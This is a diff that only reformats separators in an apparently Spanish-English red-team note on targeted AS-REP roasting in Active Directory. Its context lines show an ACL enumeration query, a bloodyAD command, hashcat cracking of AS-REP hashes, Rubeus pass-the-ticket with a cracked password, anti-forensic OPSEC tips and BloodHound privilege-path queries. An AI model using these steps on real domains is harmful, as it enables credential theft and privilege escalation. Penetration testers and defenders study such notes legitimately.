@@ -17,7 +17,7 @@ linked:
 ---
 # AS-REP Roasting - Targeted Roasting
 
-***
+---
 
 ## Concept
 
@@ -30,7 +30,7 @@ linked:
 | Detection | Event 5136 (LDAP modify userAccountControl) + Event 4768 con pre-auth=0 |
 ^asrep-targeted-concept
 
-___
+---
 
 ## ACL Required
 
@@ -54,7 +54,7 @@ Find-InterestingDomainAcl -ResolveGUIDs |
   Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
 ```
 
-___
+---
 
 ## Attack Workflow
 
@@ -91,7 +91,7 @@ Get-ADUser $Victim -Properties UserAccountControl
 hashcat -m 18200 targeted.hash rockyou.txt -O
 ```
 
-___
+---
 
 ## bloodyAD Targeted (Linux)
 
@@ -121,7 +121,7 @@ bloodyAD --host <DC> -d corp -u atacante -p 'Pass!' \
 hashcat -m 18200 targeted.hash rockyou.txt -O
 ```
 
-___
+---
 
 ## XOR Method (Legacy PowerView)
 
@@ -132,7 +132,7 @@ ___
 
 **Caveat XOR:** XOR toggles. Si flag ya set → unsets. Si off → sets. Run twice = revert. Risky si UAC ya tiene flag custom; modern recommend `Set-ADAccountControl` que es additive.
 
-___
+---
 
 ## Post-Crack Privesc
 
@@ -144,7 +144,7 @@ ___
 | `Rubeus.exe asktgt /user:<victim> /password:<cracked> /domain:corp.local /ptt` | TGT con cracked pwd | Standard auth. |
 ^asrep-targeted-postcrack
 
-___
+---
 
 ## OPSEC
 
@@ -157,7 +157,7 @@ ___
 | Backup original UAC | Restore exacto | Forensic-clean. |
 ^asrep-targeted-opsec
 
-___
+---
 
 ## BloodHound Targeted Edges
 
@@ -167,7 +167,7 @@ ___
 | `MATCH p=shortestPath((u {owned:true})-[*1..3]->(t:User {adminCount:true})) WHERE NOT t.dontreqpreauth RETURN p` | Path a priv users sin flag | Critical hunt. |
 ^asrep-targeted-bh
 
-___
+---
 
 ## Common Errors
 
@@ -180,4 +180,4 @@ ___
 | `Object class violation` | Trying to set flag en computer account | Skip computers (no kerberoast utility). |
 ^asrep-targeted-errors
 
-***
+---
